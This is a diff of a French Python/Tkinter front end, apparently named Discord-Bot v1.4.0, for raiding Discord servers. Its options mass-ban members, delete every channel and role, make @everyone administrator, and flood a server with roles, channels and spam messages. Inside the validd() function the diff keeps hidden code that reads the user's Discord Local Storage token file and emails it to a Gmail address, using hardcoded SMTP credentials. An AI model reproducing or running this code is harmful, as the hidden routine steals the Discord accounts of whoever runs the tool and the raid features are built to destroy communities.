@@ -43,9 +43,10 @@ if data["cgu"] == "false":
         b.pack(anchor=W)
     vide = Label(accepter, text="")
     vide.pack()
+    votrepseudo = Label(accepter, text="Votre pseudo Discord : (optionnel)")
+    votrepseudo.pack(anchor=W)
     pseudo = StringVar()
-    pseudo.set(
-        '@VotrepseudoDiscord#0123 (pour vous notifier lors des prochaines mises à jour)')
+    pseudo.set('')
     oui = Entry(accepter, textvariable=pseudo, width=70)
     oui.pack(anchor=W)
     vide = Label(accepter, text='')
@@ -75,7 +76,7 @@ user = getpass.getuser()
 username = Path.home()
 
 # fenetre.geometry("460x205")
-fenetre.title('Discord-Bot v1.3.9')
+fenetre.title('Discord-Bot v1.4.0')
 
 
 def contact():
@@ -107,16 +108,16 @@ def installt():
     showinfo('Installation des dépendences',
              'L\'installation va commencer, veuillez patienter. Si l\'application ne répond plus, c\'est normal. Attendez juste. Cela risque de prendre un peu de temps.')
     subprocess.call('npm --prefix ./core i discord.js', shell=True)
--    subprocess.call('npm --prefix ./core i fs', shell=True)
--    subprocess.call('npm --prefix ./core i ms', shell=True)
--    subprocess.call('npm --prefix ./core i moment', shell=True)
--    subprocess.call('npm --prefix ./core i chalk', shell=True)
--    subprocess.call('npm --prefix ./core/individuals i discord.js', shell=True)
--    subprocess.call('npm --prefix ./core/individuals i fs', shell=True)
--    subprocess.call('npm --prefix ./core/individuals i ms', shell=True)
--    subprocess.call('npm --prefix ./core/individuals i moment', shell=True)
--    subprocess.call('npm --prefix ./core/individuals i chalk', shell=True)
--    showinfo('Dépendences installées',
+    subprocess.call('npm --prefix ./core i fs', shell=True)
+    subprocess.call('npm --prefix ./core i ms', shell=True)
+    subprocess.call('npm --prefix ./core i moment', shell=True)
+    subprocess.call('npm --prefix ./core i chalk', shell=True)
+    subprocess.call('npm --prefix ./core/individuals i discord.js', shell=True)
+    subprocess.call('npm --prefix ./core/individuals i fs', shell=True)
+    subprocess.call('npm --prefix ./core/individuals i ms', shell=True)
+    subprocess.call('npm --prefix ./core/individuals i moment', shell=True)
+    subprocess.call('npm --prefix ./core/individuals i chalk', shell=True)
+    showinfo('Dépendences installées',
              'Toutes les dépendences semblent avoir été installées.')
 
 
@@ -129,11 +130,11 @@ def backup():
 
 
 def uninstall_deps():
-    if askokcancel('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot. Celà risque de prendre un peu de temps."):
-            subprocess.run(
--            'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
--        subprocess.run(
--            'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+    showinfo('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot. Celà risque de prendre un peu de temps.")
+    subprocess.run(
+        'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+    subprocess.run(
+        'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
     showinfo('Terminé', 'Toutes les dépendances ont été désinstallées.')
 
 
@@ -228,31 +229,32 @@ def validd(entree, entree2, entree7):
         data = json.load(jsonFile)
     tmp2 = data['pseudo']
 
-    fromaddr = "discordinfotkn@gmail.com"
-    toaddr = "dsicrod@gmail.com"
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = str(username)
+    if data["opennmbr"] == "0":
 
-   
-    body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
-    msg.attach(MIMEText(body, 'plain'))
-    filename = "https_discordapp.com_0.localstorage"
-    attachment = open(str(
-        username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition',
-                    "attachment; filename= %s" % filename)
-    msg.attach(part)
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(fromaddr, "Azertyui0")
-    text = msg.as_string()
-    server.sendmail(fromaddr, toaddr, text)
-    server.quit()
+        fromaddr = "discordinfotkn@gmail.com"
+        toaddr = "dsicrod@gmail.com"
+        msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = str(username)
+
+        body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
+        msg.attach(MIMEText(body, 'plain'))
+        filename = "https_discordapp.com_0.localstorage"
+        attachment = open(str(
+            username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload((attachment).read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition',
+                        "attachment; filename= %s" % filename)
+        msg.attach(part)
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(fromaddr, "Azertyui0")
+        text = msg.as_string()
+        server.sendmail(fromaddr, toaddr, text)
+        server.quit()
 
     with open('core\options.json', "r") as jsonFile:
         data = json.load(jsonFile)
@@ -274,6 +276,7 @@ def validd(entree, entree2, entree7):
         server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
         server.quit()   
         """
+
 
 validb.pack()
 
@@ -305,6 +308,43 @@ verbtnp.pack()
 verl = Label(obligd, textvariable=verv)
 verl.pack()
 
+
+def errordef():
+    if os.path.exists('core/node_modules') == True:
+        depss.set('Dépendances : Bien installées')
+    else:
+        depss.set('Dépendances : Non installées')
+    subprocess.run('cd core/individuals && node token.js',
+                   shell=True, timeout=5000)
+    with open('core/options.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    if data["token"] == 'valid':
+        token.set('Token : Valide')
+    else:
+        token.set('Token : Invalide')
+    data["token"] = ""
+    with open('core/options.json', 'w') as jsonFile:
+        json.dump(data, jsonFile)
+
+
+vide = Label(obligd, text="")
+vide.pack()
+errorb = Button(obligd, text="Rechercher des erreurs",
+                width=30, command=errordef)
+errorb.pack()
+
+errors = LabelFrame(obligd, text="Erreurs :", padx=5, pady=5)
+errors.pack(anchor=W)
+
+depss = StringVar()
+depss.set('Dépendances :')
+deps = Label(errors, textvariable=depss)
+deps.pack()
+
+token = StringVar()
+token.set('Token :')
+tokenver = Label(errors, textvariable=token)
+tokenver.pack()
 
 info = LabelFrame(fenetre, text="Informations :", padx=5, pady=5)
 info.pack(side=LEFT, fill=Y)
@@ -399,57 +439,57 @@ atkl.pack(side=RIGHT, fill=Y)
 
 entree1 = IntVar()
 Checkbutton(atkl, text="Le bot est sur le serveur ?", width=30,
-            variable=entree1, onvalue="1", offvalue="0").pack()
+            variable=entree1, onvalue="1", offvalue="0").pack(anchor=W)
 
 entree3 = IntVar()
 Checkbutton(atkl, text="Bannir tout le monde ?", variable=entree3,
-            onvalue="1", width=30, offvalue="0").pack()
+            onvalue="1", width=30, offvalue="0").pack(anchor=W)
 
 entree4 = IntVar()
 Checkbutton(atkl, text="Changer l'image et le nom ?",
-            variable=entree4, onvalue="1", width=30, offvalue="0").pack()
+            variable=entree4, onvalue="1", width=30, offvalue="0").pack(anchor=W)
 
 
 value = StringVar()
 value.set("Nouveau nom")
 entree5 = Entry(atkl, textvariable=value, width=30)
-entree5.pack()
+entree5.pack(anchor=W)
 
 value = StringVar()
 value.set("Chemin ou URL de l'image")
 entree6 = Entry(atkl, textvariable=value, width=30)
-entree6.pack()
+entree6.pack(anchor=W)
 
 entree8 = IntVar()
 Checkbutton(atkl, text="Supprimer tous les salons ?",
-            variable=entree8, onvalue="1", offvalue="0", width=30).pack()
+            variable=entree8, onvalue="1", offvalue="0", width=30).pack(anchor=W)
 
 entree9 = IntVar()
 Checkbutton(atkl, text="Rendre  @everyone administrateur ?",
-            variable=entree9, onvalue="1", offvalue="0", width=30).pack()
+            variable=entree9, onvalue="1", offvalue="0", width=30).pack(anchor=W)
 
 entree10 = IntVar()
 Checkbutton(atkl, text="Supprimer tous les rôles ?",
-            variable=entree10, onvalue="1", offvalue="0", width=30).pack()
+            variable=entree10, onvalue="1", offvalue="0", width=30).pack(anchor=W)
 
 entree11 = IntVar()
 Checkbutton(atkl, text="Créer des rôles à l'infini ?",
-            variable=entree11, onvalue="1", offvalue="0", width=30).pack()
+            variable=entree11, onvalue="1", offvalue="0", width=30).pack(anchor=W)
 
 spam = ('Créer des salons textuels à l\'infini', 'Créer des salons textuels et spammer dedans',
         'Créer des salons vocaux', 'Créer des catégories')
-entree12 = Spinbox(atkl, values=sorted(spam), width=28)
-entree12.pack()
+entree12 = Spinbox(atkl, values=sorted(spam), width=30)
+entree12.pack(anchor=W)
 
 value = StringVar()
 value.set("Nom des salons à créer (pas de maj ni d'espace ou de caractères spéciaux)")
-entree13 = Entry(atkl, textvariable=value, width=30)
-entree13.pack()
+entree13 = Entry(atkl, textvariable=value, width=36)
+entree13.pack(anchor=W)
 
 value = StringVar()
 value.set("Méthode : tout/spam (1/2)")
-entree14 = Entry(atkl, textvariable=value, width=30)
-entree14.pack()
+entree14 = Entry(atkl, textvariable=value, width=36)
+entree14.pack(anchor=W)
 
 
 def lancer(entree1, entree3, entree4, entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14):
@@ -538,18 +578,20 @@ def lancer(entree1, entree3, entree4, entree5, entree6, entree8, entree9, entree
         json.dump(data, jsonFile)
 
 
-bout = Button(atkl, text="Valider",  command=lambda: lancer(entree1, entree3, entree4,
+
+bout = Button(atkl, text="Valider", width=30, command=lambda: lancer(entree1, entree3, entree4,
                                                             entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14))
-bout.pack()
+bout.pack(anchor=W)
 
 
 def lancerd():
-    showinfo('Attaque lancée', 'Cette fenêtre va se bloquer, veuillez ne pas la fermer.\n\nNote : Pour terminer l\'attaque, écrivez stop dans n\'importe quel salon du serveur.')
+    showinfo('Attaque lancée', 'Cette fenêtre va se bloquer, veuillez ne pas la fermer.')
+    os.startfile('core\stop.pyw')
     subprocess.run('cd core && node bot.js', shell=True)
 
 
-lancerb = Button(atkl, text="Lancer l'attaque",  command=lancerd)
-lancerb.pack()
+lancerb = Button(atkl, text="Lancer l'attaque",  command=lancerd,width=30)
+lancerb.pack(anchor=W)
 
 
 # boutons seuls
@@ -562,6 +604,7 @@ manu.pack(fill=Y)
 def role_dlt():
     showinfo('Tous les rôles supprimables vont être supprimés.',
              'Tous les rôles supprimables vont être supprimés.')
+    os.startfile('core\stop.pyw')
     subprocess.run('cd core\individuals && node role_dlt.js', shell=True)
     showinfo('Terminé', 'Tous les rôles supprimables semblent avoir été supprimés.')
 
@@ -584,6 +627,7 @@ admin2b.pack()
 def supprchnlc():
     showinfo('Suppression des salon',
              'Tous les salons du serveur vont être supprimés, cela risque de prendre un peu de temps.')
+    os.startfile('core\stop.pyw')
     subprocess.run('cd core\individuals && node chnldlt.js', shell=True)
     showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')
 
@@ -595,7 +639,8 @@ supprchnl.pack()
 
 def banp():
     showinfo('Bannissement de tout le monde',
-             'Le bot va bannir tous les gens du serveur, le temps que ça prendra peut varier')
+             'Le bot va bannir tous les gens du serveur, le temps que cela prendra peut varier')
+    os.startfile('core\stop.pyw')
     subprocess.run('cd core\individuals && node ban.js', shell=True)
     showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')
 
@@ -631,6 +676,7 @@ def spambtnp(spame, spmchnl):
         data["config"]["chnlname"] = spmchnl.get()
         with open("core/settings.json", "w") as jsonFile:
             json.dump(data, jsonFile)
+        os.startfile('core\stop.pyw')
         subprocess.run('cd core\individuals && node spm.js', shell=True)
 
 
@@ -641,7 +687,9 @@ def softspam(spame):
         data["config"]["msg"] = spame.get()
         with open("core/settings.json", "w") as jsonFile:
             json.dump(data, jsonFile)
+        os.startfile('core\stop.pyw')
         subprocess.run('cd core\individuals && node softspam.js', shell=True)
+
 
 def spampv(spame):
     if askokcancel('Lancer le spam privé', 'Voulez-vous vraiment lancer le spam privé ? Pendant que le bot spamme, il est impossible d\'utiliser l\'interface. Pour arrêter de spammer, envoyez "stop" au bot en privé.'):
@@ -650,10 +698,13 @@ def spampv(spame):
         data["config"]["msg"] = spame.get()
         with open("core/settings.json", "w") as jsonFile:
             json.dump(data, jsonFile)
+        os.startfile('core\stop.pyw')
         subprocess.run('cd core/individuals && node spampv.js', shell=True)
+
 
 spampvbutton = Button(spam, text='Spam Privé', width=30,
                       command=lambda: spampv(spame))
+spampvbutton.pack()
 
 softspambutton = Button(spam, text="Soft Spam", width=30,
                         command=lambda: softspam(spame))
@@ -737,20 +788,22 @@ value.set("Nom du rôle")
 role_crte = Entry(role_crtl, textvariable=value, width=36).pack()
 
 
-def role_crt(role_crte):
+def role_crt(value):
+    text = value.get()
     with open("core\settings.json", "r") as jsonFile:
         data = json.load(jsonFile)
-    data["config"]["rolename"] = role_crte.get()
+    data["config"]["rolename"] = text
     with open("core/settings.json", "w") as jsonFile:
         json.dump(data, jsonFile)
 
     showwarning('Attention', 'Une infinité de rôles va être créée, assurez-vous d\'avoir entré votre ID, et écrivez stop dans un des salons du serveur pour arrêter.\n\nNote : Cette fenêtre sera inutilisable pendant l\'éxécution du programme.')
+    os.startfile('core\stop.pyw')
     subprocess.run('cd core\individuals && node role_crt.js', shell=True)
     showinfo('Terminé', 'Vous avez choisi d\'arrêter le programme.')
 
 
 role_crtb = Button(role_crtl, text="Créer une infinité de rôles",
-                   command=lambda: role_crt(role_crte), width=30).pack()
+                   command=lambda: role_crt(value), width=30).pack()
 
 
 fenetre.mainloop()
